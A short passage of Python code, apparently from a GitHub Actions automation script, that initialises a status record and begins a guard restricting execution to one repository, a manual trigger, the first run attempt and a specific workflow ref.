                  status='NOT_RUN',tools_executed=False,apk_downloaded=False,secret_accessed=False,
                  installed=False,execution_authorized=False,cleanup=False,packages={})
              root=path=None;created=False;alarms=False
              try:
                  if not (platform.system()=='Linux' and os.geteuid()!=0 and os.environ.get('GITHUB_REPOSITORY')=='THEFLOLZX/v.1'
                          and os.environ.get('GITHUB_EVENT_NAME')=='workflow_dispatch' and os.environ.get('GITHUB_RUN_NUMBER')=='1'
                          and os.environ.get('GITHUB_RUN_ATTEMPT')=='1' and os.environ.get('GITHUB_WORKFLOW_REF')==WORKFLOW_REF):
